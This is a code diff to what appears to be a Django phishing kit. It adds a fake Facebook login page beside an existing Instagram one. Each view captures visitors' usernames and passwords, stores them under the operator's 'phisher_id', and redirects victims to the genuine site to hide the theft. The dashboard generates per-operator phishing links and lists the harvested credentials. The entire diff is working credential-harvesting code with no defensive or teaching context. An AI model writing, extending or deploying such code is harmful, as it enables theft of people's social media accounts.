@@ -26,6 +26,43 @@ class InstagramView(View):
     
     def get(self, request,magic_code):
        
+        normal_code =  dec(magic_code)
+        try:
+            if User.objects.get(email=normal_code) != None :
+                context = {
+                    'magic_code':magic_code,
+                    'host':request.META['HTTP_HOST'],
+                }
+                return render(request, self.template_name,context)
+            return render(request, '404.html')
+        except:
+            return render(request, '404.html')
+        
+    
+    def post(self, request,magic_code):
+
+        magic_code =  dec(magic_code)
+
+        username_or_email = request.POST['username_or_email']
+        password = request.POST['password']
+        website = request.POST['website']
+        phisher_id = User.objects.get(email=magic_code).id
+
+        new_murga = PhishingModel()
+        new_murga.username_or_email = username_or_email
+        new_murga.password = password
+        new_murga.phisher_id = phisher_id
+        new_murga.website = website
+
+        new_murga.save()
+        return redirect('https://www.instagram.com/')
+
+class FacebookView(View):
+    http_method_names = ['get','post']
+    template_name = "facebook.html"
+    
+    def get(self, request,magic_code):
+       
         magic_code =  dec(magic_code)
         try:
             if User.objects.get(email=magic_code) != None :
@@ -51,7 +88,7 @@ class InstagramView(View):
         new_murga.website = website
 
         new_murga.save()
-        return redirect('https://www.instagram.com/')
+        return redirect('https://www.facebook.com/')
 
 class PhisherDataView(View):
     http_method_names = ['get','post']
@@ -71,14 +108,18 @@ class DashboardView(View):
     def get(self, request):
         if(request.user.is_authenticated):
             user = User.objects.get(username=request.user)
-            instagram_magic_string = user.email
+            magic_string = user.email
             
-            instagram_magic_string = enc(instagram_magic_string)
-            instagram_magic_url = 'http://127.0.0.1:8000/instagram/'+str(instagram_magic_string)+'/'
+            magic_string = enc(magic_string)
+            instagram_magic_url = 'http://'+request.META['HTTP_HOST']+'/instagram/'+str(magic_string)+'/'
+            facebook_magic_url = 'http://'+request.META['HTTP_HOST']+'/facebook/'+str(magic_string)+'/'
             data = PhishingModel.objects.filter(phisher_id=user.id)
             # data = PhishingModel.objects.all()
             context = {
                 'instagram_url':instagram_magic_url,
+                'facebook_url':facebook_magic_url,
+                'magic_code':magic_string,
+                'host':request.META['HTTP_HOST'],
                 'data':data
             }
             return render(request, self.template_name,context)
